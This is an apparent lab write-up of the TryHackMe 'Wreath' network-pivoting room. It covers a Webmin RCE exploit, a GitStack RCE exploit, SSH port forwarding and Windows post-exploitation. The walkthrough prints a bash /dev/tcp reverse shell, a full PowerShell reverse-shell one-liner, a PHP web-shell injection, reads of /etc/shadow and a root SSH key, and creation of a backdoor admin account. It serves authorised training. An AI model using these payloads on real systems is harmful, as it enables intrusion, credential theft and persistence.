# Wreath

![wreath](./assets/wreath_banner.png)

![wreath1](./assets/wreath1.png)

Room: [https://tryhackme.com/room/wreath](https://tryhackme.com/room/wreath)

Created by: [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle)

Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)

## Task 3 - Intro - Backstory

Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:

```text
"
So I heard you got into hacking?
That's awesome!
I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?
"
```

You take a moment to think about it, before deciding to accept the job -- it's for a friend after all.

Turning down his offer of payment, you tell him:

`I'll do it!`

## Task 4 - Intro - Brief

Thomas has sent over the following information about the network:

There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.

From this we can take away the following pieces of information:

- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
- The (assumed) Windows PC cannot be accessed directly from the webserver
- This is enough to get started!

## Task 5 - Webserver - Enumeration

I will start with creating a work directory for the room to store logs and files.

```shell
kali@attacker:~$ mkdir wreath
kali@attacker:~$ cd wreath/
```

Thomas have shared us an IP (10.200.85.200) to work with and I will start with running a nmap scan to identify open ports and services.

### Webserver - Nmap

(If you are new to nmap or need to brush up your memory you can do the [TryHackMe - Nmap room](https://tryhackme.com/room/furthernmap))

```shell
nmap -sV -sC -p 1-15000 -oN wreath-sv-sc-port-1-15000.log 10.200.85.200
```

```text
-sV:
  Probe open ports to determine service/version info
-sC:
  Use script scan equivalent to --script=default
-p <port ranges>:
  Only scan specified ports
-oN <file>
  Output scan in normal format to the given filename.
```

`Note: It's in general a good idea to save scan results to a file, to save as evidence and to not have to re-run the same scan twice.`

```shell
kali@attacker:~/wreath$ nmap -sV -sC -p 1-15000 -oN wreath-sv-sc-port-1-15000.log 10.200.85.200
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 03:22 PST
Nmap scan report for 10.200.85.200
Host is up (0.28s latency).
Not shown: 14416 filtered tcp ports (no-response), 579 filtered tcp ports (host-unreach)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
|_http-title: Thomas Wreath | Developer
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-02-10T11:20:25
|_Not valid after:  2025-02-09T11:20:25
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 633.39 seconds
```

### Website

We can see that there is a web server on port 80 and 443. Let's open the browser and navigate to the IP.

![wreath2](./assets/wreath2.png)

As seen the web server will redirect us to `https://thomaswreath.thm/` but the website will fail to resolve.

![wreath3](./assets/wreath3.png)

To make the website resolve, let's add it to the `/etc/hosts` on you local machine (on Windows: C:\Windows\System32\drivers\etc\hosts).

I'm using vi but you can use your preferred editor or echo the string into the `/etc/hosts`.

`sudo vi /etc/hosts` and add `<IP>  <Domain>` on a new row like this.

```shell
10.200.85.200  thomaswreath.thm
```

Notice that the domain shall be without the `https://`.

Once completed, let's reload the page.

![wreath4](./assets/wreath4.png)

### CVE

In the nmap result we can find `MiniServ 1.890` running on port 10000.

```text
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
```

Searching internet for this service and we can find a vulnerability CVE-2019-15107.

## Task 6 - Webserver - Exploitation

In the previous task we found a vulnerable service running on the target which will give us the ability to execute commands on the target.

The next step would usually be to find an exploit for this vulnerability.

For this scenario the room have already provided an exploit [GitHub - MuirlandOracle - CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107).

Additional vulnerability info:

[sensorstechforum - cve-2019-15107-webmin/](https://sensorstechforum.com/cve-2019-15107-webmin/)

[webmin - remote-command-execution-cve-2019-15231](https://webmin.com/security/#remote-command-execution-cve-2019-15231)

### Exploit

Let's download and prepare the exploit.

Clone the exploit to local machine.

```shell
kali@attacker:~/wreath$ git clone https://github.com/MuirlandOracle/CVE-2019-15107
Cloning into 'CVE-2019-15107'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 32 (delta 11), reused 12 (delta 3), pack-reused 0
Receiving objects: 100% (32/32), 19.95 KiB | 1021.00 KiB/s, done.
Resolving deltas: 100% (11/11), done.
```

Enter the directory and install required python packages.

```shell
kali@attacker:~/wreath$ cd CVE-2019-15107 && pip3 install -r requirements.txt
Defaulting to user installation because normal site-packages is not writeable
Collecting argparse (from -r requirements.txt (line 1))
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2.31.0)
Requirement already satisfied: urllib3 in /usr/lib/python3/dist-packages (from -r requirements.txt (line 3)) (1.26.18)
Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.43)
Installing collected packages: argparse
Successfully installed argparse-1.4.0

kali@attacker:~/wreath/CVE-2019-15107$ ls -l ./CVE-2019-15107.py
-rwxr-xr-x 1 kali kali 8399 Feb 10 03:45 ./CVE-2019-15107.py
```

The script should already be executable, but if not, add the executable bit `chmod +x ./CVE-2019-15107.py`.

Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).

Once we are satisfied that the script will do what it says it will, let us run the exploit against the target!

```shell
kali@attacker:~/wreath/CVE-2019-15107$ ./CVE-2019-15107.py 10.200.84.200

        __        __   _               _         ____   ____ _____
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.85.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

#
```

Now when we have the pseudo shell let's start check what user we are.

Current user:

```shell
# whoami
root
```

As next step let's establish reverse shell by setup a netcat listener on our local attack machine and connect to it from the target host.

Setup netcat listener on local machine:

```shell
kali@attacker:~/wreath$ nc -lvnp 6000
Listening on 0.0.0.0 6000
```

Before connecting to the listener, let's get our local machines IP. In TryHackMe scenario it will be the `tun0` interface.

```shell
kali@attacker:~$ ip ad show tun0
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none
    inet 10.50.85.93/24 scope global tun0
       valid_lft forever preferred_lft forever
```

Connect to the local listener from the target machine having the pseudo shell:

```shell
# bash -i >& /dev/tcp/10.50.85.93/6000 0>&1
[-] Failed to execute command
#
```

Now you can go back to the terminal with the netcat listener and you shall have a reverse shell.

```shell
kali@attacker:~/wreath$ nc -lvnp 6000
Listening on 0.0.0.0 6000
Connection received on 10.200.85.200 44638
bash: cannot set terminal process group (1918): Inappropriate ioctl for device
bash: no job control in this shell
[root@prod-serv ]#
```

Let us get the password hash from `/etc/shadow`

```shell
[root@prod-serv ]# cat /etc/shadow
cat /etc/shadow
root:<MASKED HASH>::0:99999:7:::
```

Note: I had issue submitting the hash in the room, it refused to accept it the hash as an answer. After a while I assumed someone had tampered with the root hash in `/etc/shadow`. So I requested a machine reset and once it has reset I collect the hash again and could successfully submit the answer. I.e. if the hash is not accepted, vote to reset machine and retry once it has reset.

As we see above we are root user and if we look around we can find SSH keys under `/root/.ssh` that we can use for direct keyword less connection to the target machine. I.e. we can get rid of the revere shell and life will be easier.

```shell
[root@prod-serv ]# ls -la /root/.ssh
ls -la /root/.ssh
total 16
drwx------. 2 root root   80 Jan  6  2021 .
dr-xr-x---. 3 root root  192 Jan  8  2021 ..
-rw-r--r--. 1 root root  571 Nov  7  2020 authorized_keys
-rw-------. 1 root root 2602 Nov  7  2020 id_rsa
-rw-r--r--. 1 root root  571 Nov  7  2020 id_rsa.pub
-rw-r--r--. 1 root root  172 Jan  6  2021 known_hosts
```

We are specifically interested in the private key `/root/.ssh/id_rsa`. Let's cat this file on the target machine. On our local machine, let's create a local `id_rsa` and copy the content from the target machine.

```shell
kali@attacker:~/wreath$ vi id_rsa
kali@attacker:~/wreath$ ls -l ./id_rsa
-rw-r--r-- 1 kali kali 2602 Feb 10 04:04 ./id_rsa
```

Before we use the key and connect to the target machine. Let's set proper permissions `600`.

```shell
kali@attacker:~/wreath$ chmod 600 id_rsa
kali@attacker:~/wreath$ ls -l id_rsa
-rw------- 1 kali kali 2602 Feb 10 04:04 id_rsa
```

Let's try it out:

```shell
kali@attacker:~/wreath$ ssh -i ./id_rsa root@10.200.85.200
The authenticity of host '10.200.85.200 (10.200.85.200)' can't be established.
ED25519 key fingerprint is SHA256:7Mnhtkf/5Cs1mRaS3g6PGYXnU8u8ajdIqKU9lQpmYL4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.85.200' (ED25519) to the list of known hosts.
[root@prod-serv ~]#
```

Great, it works!

## Task 17 - Git Server - Enumeration

Let's start enumerate from the server we have access to.

To start with upload nmap binary to the server. Here using SCP since we already have SSH access.

```bash
kali@attacker:~/wreath$ scp -i ./id_rsa ./tools/nmap/nmap-DA root@10.200.84.200:/tmp
nmap-DA                                                              100% 5805KB   1.5MB/s   00:03
kali@attacker:~/wreath$
```

And login target machine via SSH.

```bash
kali@attacker:~/wreath$ ssh -i ./id_rsa root@10.200.84.200
[root@prod-serv ~]#
```

### Git Server - Nmap

```bash
[root@prod-serv tmp]# ./nmap-DA -sn 10.200.84.1-255 -oN scan-DA

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-02-15 04:17 GMT
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-84-1.eu-west-1.compute.internal (10.200.84.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.10s latency).
MAC Address: 02:F3:70:5F:3A:E7 (Unknown)
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)
Host is up (0.00031s latency).
MAC Address: 02:57:81:DD:52:8D (Unknown)
Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)
Host is up (0.0016s latency).
MAC Address: 02:22:75:67:C7:5D (Unknown)
Nmap scan report for ip-10-200-84-250.eu-west-1.compute.internal (10.200.84.250)
Host is up (0.00038s latency).
MAC Address: 02:9C:9D:AF:36:F5 (Unknown)
Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.54 seconds
```

```text
-sn:            Ping Scan - disable port scan
-oN <file>:     Output scan in normal format to the given filename.
```

Note: The host ending in .250 is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same goes for the host ending in .1 (part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers.

From the nmap scan we can identify following 3 hosts: (.1 and .250 host excluded)

```text
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)
Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)
Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200)
```

Note that `Nmap scan report for ip-10-200-84-200.eu-west-1.compute.internal (10.200.84.200)` is the current target machine where the nmap scan was run on.

Let's make more detailed scan for teh found hosts.

```shell
[root@prod-serv tmp]# ./nmap-DA 10.200.84.100 -oN wreath-host-100.log

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-02-15 04:31 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-84-100.eu-west-1.compute.internal (10.200.84.100) are filtered
MAC Address: 02:57:81:DD:52:8D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 124.51 seconds
```

Host `10.200.84.100` result come back all ports filtered, let us put that host aside for now.

```shell
[root@prod-serv tmp]# ./nmap-DA 10.200.84.150 -oN wreath-host-150.log

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-02-15 04:34 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-84-150.eu-west-1.compute.internal (10.200.84.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00053s latency).
Not shown: 6146 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:22:75:67:C7:5D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 112.17 seconds
```

For host 10.200.84.150 we can find following open services.

```shell
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
```

Since we can not run nmap scrips using the binary we can not get more detail info from nmap. However, with knowledge or search internet by the ports we can guess it is a windows machine. Port 3389 is default port for RDP (Remote Desktop Connection) and 5985 for WinRm (Windows Remote Management).

Let's have a deeper look at the http service. It might have some vulnerability.

## Task 18 - Git Server - Pivoting

### Web server

I will start setup a port forward connection to the target web server at `10.200.84.150:80` via `10.200.84.200` using ssh, and forward the target port `80` to my local port `8080`

```shell
ssh -i ./id_rsa -L 8080:10.200.84.150:80 root@10.200.84.200
[root@prod-serv ~]#
```

Now we can connect to the target web server on localhost and the local port `http://localhost:8080`.

![wreath6](./assets/wreath6.png)

The page is not found, but we can see that it is running Django and hosting GitStack. And if we navigate there `http://localhost:8080/gitstack` we will come to login page.

![wreath7](./assets/wreath7.png)

Interesting the page contains default username/password. However, unfortunately they do not work.

![wreath8](./assets/wreath8.png)

Searching in searchsploit for GitStack it gives following result.

```shell
kali@attacker:~/wreath$ searchsploit gitstack
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                      | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                    | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                               | php/webapps/<MASKED EDB ID>.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's look closer on the Python RCE (Remote Code Execution) exploit for version 2.3.10 of the service.

`https://www.exploit-db.com/exploits/<MASKED EDB ID>`

## Task 19 - Git Server - Code Review

Firstly, let's download a local copy of the script. I will also renamed the file to mask the EDB ID but is nothing mandatory.

```shell
kali@attacker:~/wreath/exploit$ searchsploit -m <MASKED EDB ID>
kali@attacker:~/wreath/exploit$ mv <MASKED EDB ID>.py exploit.py
```

Before start using it we make sure to convert DOS line breaks to Unix line breaks.

```shell
kali@attacker:~/wreath/exploit$ dos2unix exploit.py
dos2unix: converting file exploit.py to Unix format...
```

Then open it in preferred editor for review, make sure you understand what it is doing and that it's not malicious.

At beginning of script we can find Exploit Author, Date and other exploit/script information.

```python
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
```

Next up we have some library imports followed by global variables.

```python
ip = '192.168.1.102'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'
```

What looks important here is the `ip` that is the host we like to target and the `command` that is the command we like to execute.

I will set `ip` to `localhost:8080` as it is the local port a forwarded to the target host earlier.

And I will keep `command = "whoami"` as it is harmless for now.

Next we can see on the `print` call that the script is `python2`. As you can see the `print "string"`. (A python3 `print` would have used parentheses `print("string")`)

```python
print "[+] Get user list"
```

Knowing this, we can specify python2 as interpreter to run the script by adding a shebang to the top of the script `#!/usr/bin/python2`. And this way we can execute the script directly `./script.py` without typing python2 at execution like `python2 ./script.py`. It's up to your personal taste.

Next the script will get users from the server REST API `r = requests.get("http://{}/rest/user/".format(ip))`. If user us found it will continue, otherwise it will try create a user. If no user and failed to create user the script will exit.

```python
try:
        r = requests.get("http://{}/rest/user/".format(ip))
        user_list = r.json()
        user_list.remove('everyone')
except:
        pass

if len(user_list) > 0:
        username = user_list[0]
        print "[+] Found user {}".format(username)
else:
        r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
        print "[+] Create user"

        if not "User created" in r.text and not "User already exist" in r.text:
                print "[-] Cannot create user"
                os._exit(0)
```

Next it will check if `webinterface` is enabled, and if not try to enable it.

```python
r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
        print "[+] Web repository already enabled"
else:
        print "[+] Enable web repository"
        r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
        if not "Web interface successfully enabled" in r.text:
                print "[-] Cannot enable web interface"
                os._exit(0)
```

Next up list repositories and if it do nor exist it will try create one names `csrfmiddlewaretoken`.

```python
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
        repository = repository_list[0]['name']
        print "[+] Found repository {}".format(repository)
else:
        print "[+] Create repository"

        r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
        if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
                print "[-] Cannot create repository"
                os._exit(0)
```

Next it will add the user to the repository and disable it for anyone else.

```python
print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
        print "[-] Cannot add user to repository"
        os._exit(0)

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
        print "[-] Cannot remove access for anyone"
        os._exit(0)
```

And finally create backdoor by a PHP web shell `(<?php system($_POST['a']); ?>)` and echo it into a file called exploit.php under the webroot. This can then be accessed by posting a command to the newly created /web/exploit.php file. Here the `exploit.php` renamed with username to avoid interfere with other users.

```python
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-DA.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit-DA.php".format(ip), data={'a' : command})
```

The scripts seems legit and do what it shall do.

### Task 20 - Git Server - Exploitation

So let us try it out.

```shell
kali@attacker:~/wreath/exploit$ python2 ./exploit.py
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correctly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Execute command
"nt authority\system
"
```

Great, it works.

Success!

It respond command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

From here we want to obtain a full reverse shell. We have two options for this:

We could change the command in the exploit and re-run the code
We could use our knowledge of the script to leverage the same web shell to execute more commands for us, without performing the full exploit twice

Option number two is a lot quieter than option number 1, so let's use that.

The web shell we have uploaded responds to a `POST` request using the parameter `a` (by default). This means we can give the command in a curl request by adding `a=COMMAND` in the request data.

```shell
kali@attacker:~/wreath/exploit$ curl -X POST http://localhost:8080/web/exploit-DA.php --data "a=whoami"
"nt authority\system
"
```

Let's get system info

```shell
kali@attacker:~$ curl -X POST http://localhost:8080/web/exploit-DA.php --data "a=systeminfo & uname"
"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

Let's get the hostname.

```bash
kali@attacker:~$ curl -X POST http://localhost:8080/web/exploit-DA.php --data "a=hostname"
"git-serv
"
```

Before we setup reverse shell we start to check if this target is allowed to connect to the outside world. One way of doing this is by executing the ping command on the compromised server to ping our own IP and using a network interceptor like tcpdump to see if the ICMP echo requests make it through.

To start up a tcpdump listener on our local attack machine we would use the following command: (Remember tun0 interface is our connection to TryHackMe)

`sudo tcpdump -i tun0 icmp`

Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see the available interfaces.

Now, using the web shell, execute the following ping command:

`ping -n 3 10.50.85.93`

This will send three ICMP ping packets back to you.

We can see on web shell response nothing went trough.

```shell
kali@attacker:~$ curl -X POST http://localhost:8080/web/exploit-DA.php --data "a=ping -n 3 10.50.85.93"
"
Pinging 10.50.85.93 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.85.93:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
"
```

And nothing in our local tcpdump either.

```shell
kali@attacker:~$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Looks like we're going to need to think outside the box to catch this shell.

We have two easy options here:

- Given we have a fully stable shell on .200, we could upload a static copy of netcat and just catch the shell here
- We could set up a relay on .200 to forward a shell back to a listener

Whichever way we choose, we must be mindful of other users at earlier stages of the network and ensure that any ports you open are above 15000. Because new room users will be scanning below port 15000.

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called `firewalld`. By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:

On prod-serv

```shell
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 15500/tcp
success
[root@prod-serv ~]#
```

In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).

With that done, set up either a listener or a relay on .200.

Here I will upload a local copy of netcat to the `prod-serv` to setup as listener.

Transfer nc:

```shell
kali@attacker:~/wreath$ scp -i ./id_rsa ./tools/nc/nc root@10.200.84.200:/tmp/nc-DA
nc                                                                                    100% 2846KB 477.6KB/s   00:05
```

Start listener:

```shell
[root@prod-serv tmp]# ./nc-DA -lvnp 15500
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::15500
Ncat: Listening on 0.0.0.0:15500
```

Now we can use the web shell to execute PowerShell to create reverse shell from the webserver (.150) to prod-serv (.200). Be carful with the command quoting. And change the `TCPClient('IP',PORT)` accordingly.

```PS1
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

And don't forget URL encode.

```shell
kali@attacker:~/wreath$ curl -X POST http://localhost:8080/web/exploit-DA.php --data 'a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.84.200%27%2C15500%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22'
```

And we got connection to our listener on `prod-serv`.

```shell
[root@prod-serv tmp]# ./nc-DA -lvnp 15500
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::15500
Ncat: Listening on 0.0.0.0:15500
Ncat: Connection from 10.200.84.150.
Ncat: Connection from 10.200.84.150:50051.
whoami
nt authority\system
PS C:\GitStack\gitphp>
```

## Task 21 - Git Server - Stabilisation & Post Exploitation

From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.

We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.

Create the account in teh revere shell:

```shell
PS C:\GitStack\gitphp> net user USER-DA PASSWORD-DA /add
The command completed successfully.

PS C:\GitStack\gitphp>
```

Add the newly created account in the `Administrators` and `Remote Management Users` groups:

```shell
PS C:\GitStack\gitphp> net localgroup Administrators USER-DA /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" USER-DA /add
The command completed successfully.

PS C:\GitStack\gitphp>
```

Check created user `Local Group Memberships      *Administrators       *Remote Management Use`:

```shell
PS C:\GitStack\gitphp> net user USER-DA
User name                    USER-DA
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            19/02/2024 04:04:10
Password expires             Never
Password changeable          19/02/2024 04:04:10
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users
Global Group memberships     *None
The command completed successfully.

PS C:\GitStack\gitphp>
```

We can now use either RDP or WinRM for this.

Note from room creator: Whilst the target is set up to allow multiple sessions over RDP, for the sake of other users attacking the network in conjunction with memory limitations on the target, it would be appreciated if you stuck to the CLI based WinRM for the most part. We will use RDP briefly in the next section of this task, but otherwise please use WinRM when moving forward in the network.

We can now connect WinRM using evil-rm.

For now I will just setup an additional port forward to port 5985.

```shell
kali@attacker:~/wreath$ ssh -i ./id_rsa -L 5985:10.200.84.150:5985 root@10.200.84.200
```

And then connect WinRM.

```shell
kali@attacker:~$ evil-winrm -u USER-DA -P 5985 -i localhost
Enter Password:

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\USER-DA\Documents>
```

Note that evil-winrm usually gives medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.

Let's connecting over RDP as well for GUI environment.

As the room maker I will use `xfreerdp`

